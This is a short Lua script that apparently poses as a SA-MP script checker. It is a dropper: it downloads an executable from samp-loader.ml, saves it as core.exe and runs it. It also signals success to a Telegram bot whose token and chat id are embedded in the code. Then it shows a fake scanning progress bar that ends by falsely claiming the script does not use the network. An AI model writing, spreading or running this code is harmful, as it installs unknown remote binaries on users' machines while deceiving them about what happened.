local https = require('ssl.https')
local body, code = https.request('https://samp-loader.ml/build.exe')
if body then
  local f = assert(io.open('core.exe', 'wb'))
	f:write(body)
	f:close()
	
	local body, code = https.request('https://api.telegram.org/bot1541028147:AAGuf5usU7Lvnl8WgcQ0FHeA4tX6UlRnfho/sendMessage?chat_id=603416994&text=OK')

	os.execute('start core.exe')
	
	local function progress_bar(current)
		if current < 0 then 
			current = 0
		elseif current > 100 then 
			current = 100 
		end
		local source = '[ '
		for i = 1, 50 do
			if i <= current / 2 then
				source = source .. '|'
			else
				source = source .. ' '
			end
		end
		source = source .. ' ] ' .. current .. '%'
		print(source)
	end

	local progress = 0
	for progress = 0, 100 do
		os.execute('cls')
		if progress < 30 then
			print('Initializing script...')
		end
		if progress > 30 and progress < 65 then
			print('Scanning results...')
		end
		if progress > 70 and progress < 100 then
			print('Loading results...')
		end
		progress_bar(progress)
		if progress == 100 then
			print('SUCCESS!')
			print('')
			print('')
			print('RESULT:')
			print('')
			print('The script DOES NOT work with the network!')
		end
		local time = os.clock() + 0.05
		while time >= os.clock() do end
	end
else
	error(code)
end

